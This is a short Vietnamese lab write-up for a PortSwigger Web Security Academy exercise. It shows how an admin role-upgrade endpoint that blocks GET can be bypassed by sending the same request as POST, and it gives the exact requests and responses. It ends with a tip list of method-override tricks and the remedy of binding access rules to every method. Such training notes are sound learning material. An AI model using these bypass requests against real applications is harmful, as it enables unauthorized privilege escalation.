![[idor-method.png]]
-mô tả lab: chức năng upgrade role chặn GET nhưng quên chặn POST. Mình đổi method là qua.

> [!NOTE]
> -link lab: https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented
> -test bằng `wiener:peter`

### hướng giải
- [ ] mình thấy trong JS/hướng dẫn có endpoint `/admin-roles` đổi role bằng GET `?username=wiener&action=upgrade`, thử thì bị `401 Unauthorized`
- [ ] mình thử đổi sang POST với body tương tự, sau đó quan sát gói tin trả về, mình thấy `302` thành công
- [ ] => server chỉ check quyền ở GET mà quên POST (hoặc framework chỉ bind rule cho 1 method). Mình upgrade wiener thành admin rồi vào admin là solve

### giải
```
GET /admin-roles?username=wiener&action=upgrade -> 401
POST /admin-roles
Content-Type: application/x-www-form-urlencoded

username=wiener&action=upgrade -> 302, wiener thành admin
GET /admin -> 200 admin panel
```
![[idor-method-post.png]]

> [!NOTE]
> -mẹo của mình: chỗ nào 401/403 thì thử đổi GET<->POST, thêm `X-HTTP-Method-Override`, `?_method=POST`. Rule access control phải gắn mọi method.
